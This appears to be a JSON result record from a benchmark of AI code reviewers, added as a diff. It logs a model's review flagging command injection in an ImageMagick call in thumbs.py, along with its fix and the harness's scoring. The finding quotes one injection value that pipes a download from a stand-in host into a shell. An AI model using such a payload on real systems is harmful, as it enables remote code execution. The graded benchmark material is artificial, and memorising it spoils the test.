@@ -1,0 +1,51 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "426aa0eb574d",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 76.1,
+  "setup_seconds": 0.0,
+  "total_seconds": 76.1,
+  "usage": {
+    "in": 26353,
+    "cache_read": 56704,
+    "cache_write": 0,
+    "out": 1525,
+    "source": "cli"
+  },
+  "cost_usd": 0.0788672,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "**Command injection via `shell=True`.** `upload_dir`, `name`, and `oid` are interpolated into a single shell string. A value such as `name=\"x.png; curl evil.test|sh\"` (or metacharacters in `upload_dir` / `oid`) runs arbitrary commands as the service user.\n\nImageMagick policy delegates do not require a shell \u2014 keep the argv-list form so arguments never pass through a shell:\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nIf IM7 needs the `magick` binary, use `[\"/usr/bin/magick\", \"convert\", src, dst]` (still `shell=False`). Never switch to `shell=True` for this."
+    }
+  ],
+  "summary": "## Verdict\n\nCritical security regression: this change introduces shell injection in thumbnail conversion and must not merge.\n\n## Findings\n\n| # | Severity | File | Summary |\n|---|----------|------|---------|\n| 1 | \ud83d\udea8 critical | `thumbs.py:6` | `subprocess.run(..., shell=True)` with unquoted path interpolation enables command injection |\n\n## Notes\n\nImageMagick 7 policy/delegate behavior does not require a shell. Keep the argv-list form (or an equivalent `shell=False` invocation). If the binary name changed under IM7, call `/usr/bin/magick` / `/usr/bin/convert` as a fixed absolute path with separate arguments.\n\n`upload_dir`, `name`, and `oid` are all interpolated into the shell string. Any metacharacters in those values become shell syntax (`;`, `|`, `$(...)`, backticks, spaces, etc.). Removing the prior note about upstream `ALLOWED_FILES` validation makes the trust boundary even less clear; even with a regex, `shell=True` remains the wrong primitive here.\n\n**Recommendation:** request-changes",
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
